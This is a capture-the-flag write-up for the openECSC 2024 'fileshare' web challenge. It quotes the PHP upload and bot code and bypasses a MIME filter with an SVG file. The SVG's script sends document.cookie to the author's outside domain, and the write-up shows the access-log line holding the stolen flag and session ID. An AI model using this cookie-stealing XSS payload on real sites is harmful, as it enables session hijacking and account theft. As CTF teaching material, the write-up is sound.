# fileshare

## Description

```
You can now share your files for free thanks to our new disruptive technology!

Site: https://fileshare.challs.open.ecsc2024.it
```

## Categories

- `web`

## Provided Files

- `fileshare.zip`

## Solve Process

We can firstly observe the provided source code, which shows us where the flag is located.

```php
if (isset($_POST['email']) || isset($_POST['fileid']) || isset($_POST['message'])) {
    
    $fileid = $_POST['fileid'];
    if (preg_match('/^[a-f0-9]{30}$/', $fileid) === 1) {

        $url = 'http://' . getenv('HEADLESS_HOST');
        $chall_url = 'http://' . getenv('WEB_DOM');
        $act1 = array('type' => 'request', 'url' => $chall_url);
        $act2 = array('type' => 'set-cookie', 'name' => 'flag', 'value' => getenv('FLAG'));
        $act3 = array('type' => 'request', 'url' => $chall_url . '/download.php?id=' . $fileid);
        
        $data = array('actions' => [$act1, $act2, $act3], 'browser' => 'chrome');
        $data = json_encode($data);

        $options = array(
            'http' => array(
                'header'  => "Content-type: application/json\r\n" . "X-Auth: " . getenv('HEADLESS_AUTH') . "\r\n",
                'method'  => 'POST',
                'content' => $data
            )
        );

        $context  = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        if ($result === FALSE) {
            echo '<div class="alert alert-danger" role="alert">Sorry, there was an error sending your message.</div>';
        } else {
            echo '<div class="alert alert-success" role="alert">Thank you, we are taking care of your problem!</div>';
        }
```

Okay so we're dealing with a headless browser again and the flag is inside a cookie. Additionally, this essentially lets us open a file of our choice based on the files ID.

Lets examine a bit further.

```php
if( isset($_FILES['file']) ) {
    $target_dir = "/uploads/";

    $fileid = bin2hex(random_bytes(15));
    $target_file = $target_dir . $fileid;

    $type = $_FILES["file"]["type"];
    // I don't like the letter 'h'
    if ($type == "" || preg_match("/h/i", $type) == 1){
        $type = "text/plain";
    }

    $db = db_connect();
```

This is the file upload endpoint, which is always very interesting because it also lets us show and download the files, so this could point to a `XSS` vulnerability.

Since `html` is seemingly filtered out here, we can think of other payloads, such as `.svg`. Let's craft a payload that calls my domain with the `document.cookie` specifier embedded, so I get all the cookies the request has currently set.

```svg
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="">
  <script type="text/javascript">
    window.location.replace(`https://k1f0.dev/${encodeURI(document.cookie)}`)
  </script>
</svg>
```

After uploading this payload to the upload endpoint, clicking "Show" yields me this.

```
https://fileshare.challs.open.ecsc2024.it/download.php?id=a164fe7bbedb39cae5098b4c28b1d6
```

And above link redirects me to my actual page, so we know a script execution takes place and a request is successfully made.

We now just need to input it as a support request, using the file id `a164fe7bbedb39cae5098b4c28b1d6` from above

And after submitting it and watching my NGINX access log, we do actually get a request.

```
- - "GET /PHPSESSID=21481e27e0323ca4811c28684a34ad84;%20flag=openECSC%7Bwhy_w0uld_u_sh4re_th1s%7D HTTP/1.1" 404 972 "https://fileshare.challs.open.ecsc2024.it/" "chrome-headless-agent"
```

And that is a solve.
